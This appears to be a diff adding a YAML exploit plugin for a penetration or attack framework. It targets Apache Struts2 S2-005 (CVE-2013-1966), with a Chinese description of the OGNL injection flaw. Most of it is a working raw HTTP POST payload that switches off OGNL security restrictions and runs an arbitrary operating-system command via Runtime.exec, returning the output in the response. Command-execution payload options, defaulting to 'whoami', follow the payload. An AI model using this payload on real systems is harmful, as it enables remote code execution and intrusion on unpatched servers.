@@ -1,0 +1,49 @@
+info:
+    app: Struts2
+    name: S2_005
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2013-05-23"
+    create_date: "2024-10-06 12:31:22"
+    update_date: "2024-10-06 12:31:22"
+    scope: Struts 2.0.0 - 2.3.14.1
+    description: |
+        Struts2 标签中 '<s:a>' 和 '<s:url>' 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
+
+        1. none - 链接不包含请求的任意参数值（默认）
+        2. get - 链接只包含 GET 请求中的参数和其值
+        3. all - 链接包含 GET 和 POST 所有参数和其值
+
+        '<s:a>'用来显示一个超链接，当'includeParams=all'的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
+    vul_id: CVE-2013-1966
+    detail: |
+        利用点在URI里
+        URL如http://192.168.111.129:8080/link.action
+    payload: |-
+        POST /example/HelloWorld.action HTTP/1.0
+        Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)
+        Host: 30.1.20.3:8080
+        Content-Length: 667
+
+        ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: cmd2
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: getmsg2
+      alias: 获取信息
